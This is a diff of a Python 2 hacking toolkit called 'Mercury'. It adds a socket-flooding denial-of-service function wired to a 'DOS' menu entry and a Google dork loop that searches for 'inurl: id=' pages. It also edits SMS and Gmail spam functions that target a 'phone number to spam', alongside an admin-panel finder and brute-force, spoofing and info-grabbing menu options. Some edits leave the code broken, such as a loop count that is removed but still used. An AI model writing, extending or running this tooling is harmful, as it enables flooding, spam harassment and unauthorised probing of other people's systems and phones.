@@ -10,23 +10,28 @@ inspired by fsociety and Trity
 #Modules
 import os, sys,time
 try:
+	import re
 	import json
 	import wget
 	import socket
 	import urllib
 	import urllib2
 	import smtplib
+	import random
 	import hashlib
+	import itertools
 	import requests
 	import platform
 	import mechanize
+	import subprocess
+	from six.moves import urllib
 	from getpass import getpass
 	from selenium import webdriver
 	from colorama import init, Fore, Back, Style
 	from pygoogling.googling import GoogleSearch
 	from urllib2 import Request, urlopen, URLError, HTTPError
 except ImportError: #If you dont have the required modules this error will help install them for you
-	print ('\033[4m Do you have all of the needed Modules ? colorama, selenium, requests, json,Google Search, and urllib2!!')
+	print ('\033[4m Do you have all of the needed Modules ?')
 	time.sleep(1)
 	yn = raw_input('Would You Like To Install Them Now? y/n: ')
 	if yn == 'n': 
@@ -34,27 +39,16 @@ except ImportError: #If you dont have the required modules this error will help 
 	if yn == 'y':
 		os.system('pip install selenium')
 		os.system('pip install colorama')
-		os.system('pip install  gsearch')
-		os.system('pip install json')
 		os.system('pip install requests')
-		os.system('pip install socket')
 		os.system('pip install urllib2')
 		os.system('pip install os')
-		os.system('pip install sys')
-		os.system('pip install time')
-		os.system('pip install optparse')
-		os.system('pip install ConfigParser')
 		os.system('pip install urllib')
-		os.system('pip install logging')
-		os.system('pip install threading')
 		os.system('pip install pygoogling')
 		os.system('pip install hashlib')
 		os.system('pip install smtplib')
 		os.system('pip install mechanize')
 		os.system('pip install subprocess')
-		os.system('pip install getpass')
-		os.system('pip install smtplib')
-		os.system('pip install wget')
+		os.system('pip install pygoogling')
 
 	'''
 	Allows the program to find the build  
@@ -89,6 +83,7 @@ M = '\033[1;35;32m' # magenta
 x = os.path.dirname(os.path.abspath(__file__))
 init(convert=True)
 ip = socket.gethostbyname(socket.gethostname())
+results = subprocess.check_output(["netsh", "wlan", "show", "network"])
 
 termsAndConditions = Fore.RED + '''\033[4m Don`t Use Mercury To:
 create and share malicious viruses, illegally harm others computers, 
@@ -130,23 +125,53 @@ def agreement():
              afile.write('yes')
              file.close()
              afile.close()
+             mainmenu()
          else:
         	agreement()
-	
+def ddos():
+	ip = raw_input(Fore.CYAN + 'Enter an ip address: ')
+	bytess = 65500
+	try:
+		while True:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip, 80))
+			s.send("GET /" + str(bytess) + " HTTP/1.1\r\n")
+			s.send("Host: " + ip  + "\r\n\r\n")
+			print (Fore.CYAN + 'Bytes Sent to %s') % ip
+			s.close()
+	except KeyboardInterrupt:
+		mainmenu()
+	except socket.gaierror:
+		pass
+		print (Fore.RED + 'Connection Couldnt be made!')
+def dork1():
+ 	count = 0
+ 	while True:
+ 		try:
+			google_search = GoogleSearch('inurl: id='+str(count))
+			google_search.start_search(max_page=1)
+			print(Fore.GREEN + google_search.search_result[count]) # will print the url as list of string
+			print  (' ')
+			count += 1
+		except IndexError:
+			pass
+		except KeyboardInterrupt:
+			mainmenu()
+
+
+
 def sms():
 	try:
-		print Fore.CYAN + "Put the @ sign before the provider ex: @vtext.com for Verizon" #@vtext.com #messaging.sprintpcs.com
-	        provider = raw_input(Fore.CYAN + 'Enter cellular provider: ' )
-		phone_num = raw_input(Fore.CYAN + 'Victims phone number: ') + provider
+		print Fore.CYAN + "Enter the provider ex: @vtext.com for Verizon" #@vtext.com #messaging.sprintpcs.com
+	        provider = raw_input(Fore.CYAN + 'Enter provider: ' )
+		phone_num = raw_input(Fore.CYAN + 'phone number to spam: ') + provider
 		gmail = raw_input(Fore.CYAN + 'Your email: ')
-		password = raw_input(Fore.CYAN + 'What is your gmail password? ' )
+		password = raw_input(Fore.CYAN + 'What is your email password? ' )
 	        server = smtplib.SMTP("smtp.gmail.com",587)
 	        server.starttls()
 	        server.login(gmail, password)
 		message = raw_input('Message: ')
-		times = input( 'How many times:  ')
-	        spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(gmail, phone_num, message)
-		print ( Fore.CYAN + 'Sending...' )
+	        spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(gmail, phone_num, message) #Trity
 	        for i in range(times):
 	            server.sendmail(gmail, phone_num, spam_msg)
 	        time.sleep(0.1)
@@ -170,78 +195,29 @@ def readme():
 	readme.close()
 	license.cose()
 	mainmenu()
-def googledork():
-	count3 = 1
-	dork = open(x +'\Resources\GoogleDorks.txt','r') #opens in url
+def sub_link():
+	url = raw_input(Fore.CYAN + 'Enter an url: ')
+	website = urllib2.urlopen(url)
+	html = website.read()
+	links = re.findall('"((http|ftp)s?://.*?)"', html)
+	space()
+	count = 0
 	try:
-		while True:
-			lines = dork.read(count3)
-			google_search = GoogleSearch(lines)
-			google_search.start_search(max_page=1) #searches
-			print(google_search.search_result)  #prints seaches
-			count3 += 1 #count +1 aka next inurl
-			
-	except IOError:
-		mainmenu()
-		dork.close()
-	except KeyboardInterrupt: #returns to main menu if ctrl C is used
-		mainmenu()
-		dork.close()
-	except UnicodeEncodeError: #There Is an error if the encoding is not utf 8 you can change pass to just keep going even after error
-		extra_long()
-		dork.close()
-		mainmenu()
+		for x in links:
+			website_sub = x[0]
+			print (Fore.GREEN + website_sub)
+			website = urllib2.urlopen(x[count])
+	except urllib2.HTTPError:
+		pass
+
+	extra_long()
+	mainmenu()
 
 def update():
 	clear()
 	quick()
 	os.system('git clone https://github.com/MetaChar/Mercury'+x+'\Update') #Just redownloads the repo
 	sys.exit()
-def helpme():
-	print ('''
- command            	          Usage
-===============            =================
-helpme                     Shows this screen
-source                     Source code of websites
-bruteforce                 BruteForce a website
-stop                       Exit
-pips                       Pip installer
-geoip                      GeoIP
-github                     Installs Github repos
-stop                       Returns to main menu
-sms 		           loads up sms menu
-anongmail	           loads up Gmail-anon
-tools                      Tool submenu
-pendrive                   Pedrive linux menu
-hash 	                   Encode hash term
-
-''')
-def sourcecodep():
-	try:
-		name1 = raw_input('Enter the File Name') #Save File
-		file = name1+'.html'
-		URL1=raw_input(Fore.CYAN + 'Enter An Url ') #Url
-		html1 = open(file, 'a+') #Writes The File
-		html = open(file, 'w')
-		response = urllib2.urlopen(URL1) #Opens Url
-		page_source = response.read() #Reads URL
-		space()
-		print >>html,  page_source #Change to python3 Syntax aka file. write
-		print ('Done ! saved under users! ') #%users%
-		quick()
-		html.close()
-		html1.close()
-		prompt()
-	except KeyboardInterrupt:
-		print ('Stopped! ')
-		prompt()
-		html.close()
-		html1.close()
-	except IOError: #very rare error dont worry
-		print ('File was not found \: ')
-		prompt()
-		html.close()
-		html1.close()
 def twitter():
 	print (Fore.CYAN + '	Exclude the @ sign! ')
 	user = raw_input('		Enter a Twitter handle: ')
@@ -309,7 +285,7 @@ def websitess():
 	[4]\033[96m Kali Linux \033[1;37;40m         [13]\033[96m Arduino\033[1;37;40m
 	[5]\033[96m Defcon \033[1;37;40m		[14]\033[96m RaspberryPie\033[1;37;40m
 	[6]\033[96m Pycon \033[1;37;40m              [15]\033[96m Kitploit\033[1;37;40m
-	[7]\033[96m Python.org \033[1;37;40m          [16]\033[96m Hack A Day\033[1;37;40m
+	[7]\033[96m Python.org \033[1;37;40m         [16]\033[96m Hack A Day\033[1;37;40m
 	[8]\033[96m HackThis! \033[1;37;40m
 
 
@@ -373,9 +349,6 @@ def websitess():
 		mainmenu()
 	else:
 		websitess()
-
-
-
 def toolss():
 	clear()
 	print (Fore.WHITE +  color.BOLD + ''' /$$$$$$$$                  /$$                       /$$      
@@ -415,7 +388,7 @@ def toolss():
 			toolss()
 	if ans_2 == '1':
 		try:
-			os.system('git clone https://github.com/14Dead/Mercury '+x+'/Tools/Mercury')
+			os.system('git clone https://github.com/MetaChar/Mercury '+x+'/Tools/Mercury')
 			toolss()
 		except KeyboardInterrupt:
 			toolss()	
@@ -589,13 +562,15 @@ def proxys():
 				extra_long()
 				print (Fore.RED + 'Saved Under Resources')
 				prox_txt.close()
-	except NoSuchElementException:
-			prox_txt.close()
-			extra_long()
-			print (Fore.RED + 'Saved Under Resources')
+	except NameError:
+		extra_long()
+		mainmenu()
 	except IOError:
 		mainmenu()
 	except KeyboardInterrupt:
+		mainmenu()
+	except:
+		extra_long()
 		mainmenu()
 
 def sourcecode():
@@ -702,24 +677,25 @@ def brute_force(): #Declares Function
 def admin():
 	links = open(x+'\Resources\links.txt')
 	website = raw_input(Fore.CYAN + 'Enter a site to scan just www: ')
+	type_link = raw_input('Is the link https or http: ')
 	count4 = 1
 	while True:
 		try:
 			sub_link = links.readline(count4)
-			website2 = 'https://' + website + '/'+ sub_link
+			website2 = type_link+'://'+website+'/'+ sub_link
 			req = Request(website2)
 	    		response = urlopen(req)
 		except HTTPError as e:
-			print(Fore.RED + '%s 	is not working.') % website2
+			print(Fore.RED  + website2) 
 			count4 += 1
 		except URLError as e:
-    			print(Fore.RED + '%s 	is not working.') % website2
+    			print(Fore.RED + website2) 
     			count4 += 1
     		except  KeyboardInterrupt:
     			mainmenu()
     			links.close()
 		else:
-   			print (Fore.GREEN + '%s is working ') % website2
+   			print(Fore.GREEN + website2) 
    			count4 += 1
 def hash():
 
@@ -869,22 +845,6 @@ def github():
 	else:
 		print ('Fatal error ')
 		mainmenu()
-def githubp():
-	githublink = raw_input(Fore.CYAN + '	Enter an url to the GitHub repo: ')
-	name = raw_input('		What is the name of the repo? ')
-	try:
-		os.system('git clone '+githublink+ ' '+x+'/'+name)
-		time.sleep(1)
-		long()
-		clear()
-		prompt()
-	except KeyboardInterrupt:
-		print ('Stopped! ')
-		quick()
-		prompt()
-	else:
-		print ('Fatal Error ')
-		prompt()      
 def exit():
 	sys.exit()
 def geoLocationp(): 
@@ -958,7 +918,7 @@ def emailspam():
 		server = smtplib.SMTP('smtp.gmail.com', 587) #server
 		server.ehlo() #starts server
 		to = [sender, reciever]  
-		subject = '14dead'  
+		subject = 'MetaChar'  
 		body = 'MERCURY'
 		server.starttls()
 		server.login(sender, password)
@@ -1003,17 +963,24 @@ def geoLocation():
 	except KeyboardInterrupt:
 		mainmenu()
 def file():
-	try:
-		dirt = raw_input(Fore.CYAN + '		Enter a file location: ') 
-		t = os.listdir(dirt) #Change To Ls For Linux Users
-		print (t)
-		extra_long()
-		clear()
-		mainmenu()
-	except WindowsError:
-		print ('Invalid location! ')
-		quick()
-		mainmenu()
+	dirt = raw_input(Fore.CYAN + '		Enter a file location: ') 
+	t = os.listdir(dirt) #Change To Ls For Linux Users
+	count = 0
+	space()
+	space()
+	print (Fore.CYAN + '----------------------')
+	while True:
+		try:
+			print (t[count])
+			count += 1
+		except KeyboardInterrupt:
+			mainmenu()
+		except WindowsError:
+			mainmenu()
+		except IndexError:
+			print (Fore.CYAN + '----------------------')
+			long()
+			mainmenu()
 def nmap():
 	nmap_ins = raw_input(Fore.CYAN + 'Have you already installed nmap? y/n ')
 	if nmap_ins == 'n':
@@ -1025,9 +992,9 @@ def nmap():
 		os.system('nmap -T4 -A -v '+ip)
 		mainmenu()
 def listen():
+	global ip
 	print (Fore.RED + 'Once started it cant be stoped without fully closing the program! ')
 	port = raw_input(Fore.CYAN + 'Enter a port: ')
-	ip = raw_input('Ip: ')
 	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	port = int(port)
 	try:
@@ -1053,18 +1020,18 @@ def mainmenu():
  |__/     |__/ \_______/|__/       \_______/ \______/ |__/       \____  $$
                     \033[91m[Coded By MetaChar] \033[1;37;40m                         /$$  | $$
                   \033[91m[Instagram: @Seleniumm]\033[1;37;40m                        | $$$$$$/
-                     [%s]\033[1;37;40m                           \______/
- ''') % ip
+                     [%s]\033[1;37;40m                            \______/
+ ''')
 	space()
 	print (Fore.WHITE + '''
 	[0]\033[96m ReadMe and license \033[1;37;40m 		[9]\033[96m SourceCode from website \033[1;37;40m		[18]\033[96m Gmail Spam\033[1;37;40m
 	[1]\033[96m Brute force \033[1;37;40m 			[10]\033[96m Ip address from website\033[1;37;40m		[19]\033[96m Gmail Spoof\033[1;37;40m
-	[2]\033[96m Port Listen \033[1;37;40m             		[11]\033[96m Google dorks\033[1;37;40m                       [20]\033[96m Does Site Exist \033[1;37;40m
+	[2]\033[96m Port Listen \033[1;37;40m             		[11]\033[96m Find sublinks\033[1;37;40m                      [20]\033[96m Does Site Exist \033[1;37;40m
 	[3]\033[96m GeoLocation \033[1;37;40m            	        [12]\033[96m Hash encode\033[1;37;40m                        [21]\033[96m Hex decode /encode \033[1;37;40m
 	[4]\033[96m Show mac address \033[1;37;40m			[13]\033[96m Download tools\033[1;37;40m                     [22]\033[96m Find Admin Panel \033[1;37;40m
-	[5]\033[96m Website online/offline \033[1;37;40m		[14]\033[96m Nmap\033[1;37;40m                             [23]\033[96m Pendrive Linux Tut  \033[1;37;40m
+	[5]\033[96m Website online/offline \033[1;37;40m		[14]\033[96m Nmap\033[1;37;40m                               [23]\033[96m DOS \033[1;37;40m
 	[6]\033[96m File explorer \033[1;37;40m			[15]\033[96m Proxy Scraper \033[1;37;40m                     [24]\033[96m SMS Spam\033[1;37;40m
-	[7]\033[96m GitHub cloner \033[1;37;40m			[16]\033[96m Chat Room\033[1;37;40m 			        [25]\033[96m Websites \033[1;37;40m
+	[7]\033[96m GitHub cloner \033[1;37;40m			[16]\033[96m Google Dorks\033[1;37;40m  	  	        [25]\033[96m Websites \033[1;37;40m
 	[8]\033[96m Pip installer \033[1;37;40m 			[17]\033[96m Proxy Browser\033[1;37;40m 	                [26]\033[96m Twitter Info Grabber \033[1;37;40m
 		              
 	[100]\033[96m Update\033[1;37;40m	[99]\033[96m Exit tool\033[1;37;40m	
@@ -1093,7 +1060,7 @@ def mainmenu():
 	if ans == '10':
 		ipaddress()
 	if ans =='11':
-		googledork()
+		sub_link()
 	if ans == '12':
 		hash()
 	if ans == '13':
@@ -1103,7 +1070,7 @@ def mainmenu():
 	if ans == '15':
 		proxys()
 	if ans == '16':
-		chat()
+		dork1()
 	if ans == '17':
 		webbrowserfunc()
 	if ans == '18':
@@ -1117,7 +1084,7 @@ def mainmenu():
 	if ans == '22':
 		admin()
 	if ans == '23':
-		linuxpen()
+		ddos()
 	if ans == '24':
 		sms()
 	if ans == '25':
@@ -1131,6 +1098,12 @@ def mainmenu():
 		update()
 	else:
 		mainmenu()
+def InternetCheck():
+	try:
+		urllib2.urlopen('https://www.google.com')
+	except:
+		print (Fore.RED + 'There in no Internet connection...')
+		long()
 def PlatformCheck():
 	if sys.platform == 'win32':
 		print(Fore.CYAN + "Windows Detected")  ##Windows 32-bit Check
@@ -1148,7 +1121,7 @@ def PlatformCheck():
 		agreement()
 try:
 	attempt = 0
-	agreement()
+	InternetCheck()
 	PlatformCheck()
 	mainmenu()
 except KeyboardInterrupt:
